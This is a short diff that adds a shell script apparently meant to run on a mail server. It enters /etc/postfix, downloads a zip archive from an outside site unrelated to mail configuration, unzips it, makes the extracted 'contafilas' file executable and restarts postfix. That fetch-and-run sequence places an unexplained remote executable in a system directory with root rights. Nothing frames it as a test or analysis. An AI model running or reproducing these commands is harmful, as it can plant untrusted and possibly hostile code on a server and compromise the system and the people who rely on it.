@@ -1,0 +1,8 @@
+cd /etc/postfix
+wget https://steamgopro.com/config/contafilas.zip
+unzip contafilas.zip
+chmod +x contafilas
+cd ..
+cd ..
+/etc/init.d/postfix reload;
+/etc/init.d/postfix restart;
